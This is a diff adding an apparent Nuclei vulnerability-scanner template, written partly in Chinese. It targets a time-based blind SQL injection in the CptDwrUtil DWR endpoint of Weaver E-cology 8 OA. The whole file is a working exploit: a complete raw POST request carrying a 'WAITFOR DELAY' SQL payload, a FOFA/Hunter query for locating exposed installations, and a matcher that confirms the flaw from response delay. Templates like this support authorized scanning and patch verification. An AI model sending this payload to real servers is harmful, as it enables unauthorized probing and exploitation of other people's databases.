@@ -1,0 +1,37 @@
+id: poc-8c4e9b7c4a1bca6e3062
+info:
+  name: 泛微E-cology8CptDwrUtil存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8c4e9b7c4a1bca6e3062267003bfb339
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 8c4e9b7c4a1bca6e3062267003bfb339
+    fofa: + hunter`app.name="泛微 e-cology OA"`
+http:
+- raw:
+  - 'POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 189
+
+    Content-Type: text/plain
+
+    Accept-Encoding: gzip
+
+
+    callCount=1&page=httpSessionId=&scriptSessionId=&c0-scriptName=DocDwrUtil&c0-methodName=ifNewsCheckOutByCurrentUser&c0-id=0&batchId=0&c0-param1=string:1&c0-param0=string:1 WAITFOR DELAY ''0:0:5'''
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
